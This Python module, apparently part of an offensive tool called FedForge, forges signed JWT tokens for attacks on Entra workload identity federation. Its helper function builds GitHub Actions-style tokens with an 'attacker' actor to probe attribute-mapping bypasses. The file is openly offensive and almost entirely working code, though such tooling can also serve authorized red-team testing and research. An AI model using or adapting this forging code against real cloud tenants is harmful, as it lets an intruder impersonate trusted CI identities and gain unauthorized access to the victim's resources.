"""
FedForge - Token Forging
Create custom JWT tokens for federation attacks
"""

import jwt
import time
from datetime import datetime, timedelta


class TokenForge:
    """Forge JWT tokens for Entra WIF exploitation"""
    
    def __init__(self, private_key, kid="key-1"):
        self.private_key = private_key
        self.kid = kid
    
    def create_token(
        self,
        issuer,
        subject,
        audience="api://AzureADTokenExchange",
        additional_claims=None,
        lifetime=3600
    ):
        """
        Create a JWT token for federation
        
        Args:
            issuer: The issuer URL (your OIDC provider)
            subject: Subject identifier (e.g., "system:serviceaccount:myapp")
            audience: Token audience (default is Entra's standard)
            additional_claims: Dict of additional claims to include
            lifetime: Token lifetime in seconds (default 1 hour)
        
        Returns:
            JWT token string
        """
        now = int(time.time())
        
        # Standard claims
        payload = {
            "iss": issuer,
            "sub": subject,
            "aud": audience,
            "exp": now + lifetime,
            "iat": now,
            "nbf": now,  # Not before
        }
        
        # Add any additional claims
        if additional_claims:
            payload.update(additional_claims)
        
        # Create JWT with RS256 algorithm
        token = jwt.encode(
            payload,
            self.private_key,
            algorithm="RS256",
            headers={"kid": self.kid}
        )
        
        return token
    
    def decode_token(self, token, verify=False):
        """
        Decode a JWT token (for debugging)
        
        Args:
            token: JWT token string
            verify: Whether to verify signature (default False for debugging)
        
        Returns:
            Decoded token payload
        """
        if verify:
            # Would need public key to verify
            decoded = jwt.decode(
                token,
                self.private_key.public_key(),
                algorithms=["RS256"]
            )
        else:
            # Just decode without verification
            decoded = jwt.decode(
                token,
                options={"verify_signature": False}
            )
        
        return decoded
    
    def print_token_info(self, token):
        """Print human-readable token information"""
        try:
            decoded = self.decode_token(token, verify=False)
            
            print("\n" + "="*60)
            print("Token Information")
            print("="*60)
            print(f"Issuer (iss):     {decoded.get('iss')}")
            print(f"Subject (sub):    {decoded.get('sub')}")
            print(f"Audience (aud):   {decoded.get('aud')}")
            
            # Format timestamps
            if 'iat' in decoded:
                iat = datetime.fromtimestamp(decoded['iat'])
                print(f"Issued At (iat):  {iat.strftime('%Y-%m-%d %H:%M:%S')}")
            
            if 'exp' in decoded:
                exp = datetime.fromtimestamp(decoded['exp'])
                print(f"Expires (exp):    {exp.strftime('%Y-%m-%d %H:%M:%S')}")
                
                # Show time remaining
                now = datetime.now()
                if exp > now:
                    remaining = exp - now
                    print(f"Time Remaining:   {remaining}")
                else:
                    print(f"Status:           EXPIRED")
            
            # Show any additional claims
            standard_claims = {'iss', 'sub', 'aud', 'exp', 'iat', 'nbf'}
            additional = {k: v for k, v in decoded.items() if k not in standard_claims}
            
            if additional:
                print("\nAdditional Claims:")
                for key, value in additional.items():
                    print(f"  {key}: {value}")
            
            print("="*60 + "\n")
            
        except Exception as e:
            print(f"[!] Error decoding token: {e}")


def create_github_actions_token(forge, repo, ref="refs/heads/main", actor="attacker"):
    """
    Helper function to create a GitHub Actions-style token
    Useful for testing attribute mapping bypasses
    """
    issuer = "https://token.actions.githubusercontent.com"
    subject = f"repo:{repo}:ref:{ref}"
    
    additional_claims = {
        "repository": repo,
        "ref": ref,
        "actor": actor,
        "workflow": "CI",
        "job_workflow_ref": f"{repo}/.github/workflows/ci.yml@{ref}",
    }
    
    return forge.create_token(
        issuer=issuer,
        subject=subject,
        audience="api://AzureADTokenExchange",
        additional_claims=additional_claims
    )